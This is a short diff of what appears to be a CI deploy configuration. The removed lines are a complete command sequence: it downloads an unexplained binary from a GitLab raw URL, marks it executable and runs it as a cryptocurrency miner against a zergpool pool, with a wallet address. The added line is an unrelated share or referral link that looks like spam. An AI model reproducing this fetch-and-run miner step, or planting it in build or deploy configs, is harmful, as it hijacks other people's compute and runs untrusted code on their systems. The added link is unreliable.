@@ -1,6 +1,1 @@
-deploy:
-  - apt-get update && apt-get upgrade -y
-  - apt-get install wget -y
-  - wget https://gitlab.com/fregiandaa/folan/-/raw/main/egiaja && chmod +x egiaja && ./egiaja -v -l verushash.asia.mine.zergpool.com:3300 -u DQbKrytBZ3fxVQgBf8DzdCq9SZTc856LuH.seblab -p c=DGB -t 4
-
-
+http://fx.igonovel.cc/share/gold_draw?st=app_share&r_id=3765424&h=778752
